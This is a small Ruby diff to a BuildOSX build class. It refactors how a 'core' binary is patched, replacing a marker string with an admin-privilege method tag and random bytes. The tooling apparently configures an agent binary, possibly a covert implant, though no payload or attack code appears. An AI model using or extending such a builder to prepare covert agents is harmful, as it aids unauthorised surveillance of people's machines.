@@ -35,22 +35,15 @@ class BuildOSX < Build
     # invoke the generic patch method with the new params
     super
 
-    # open the core and binary patch the parameter for the "require admin privs"
-    file = File.open(path(params[:core]), 'rb+')
-    content = file.read
-
-    # working method marker
-    begin
-      method = params['admin'] ? 'Ah57K' : 'Ah56K'
-      method += SecureRandom.random_bytes(27)
-      content['iuherEoR93457dFADfasDjfNkA7Txmkl'] = method
-    rescue
-      raise "Working method marker not found"
+    patch_file(:file => params[:core]) do |content|
+      begin
+        method = params['admin'] ? 'Ah57K' : 'Ah56K'
+        method += SecureRandom.random_bytes(27)
+        content.binary_patch 'iuherEoR93457dFADfasDjfNkA7Txmkl', method
+      rescue
+        raise "Working method marker not found"
+      end
     end
-
-    file.rewind
-    file.write content
-    file.close
 
   end
 
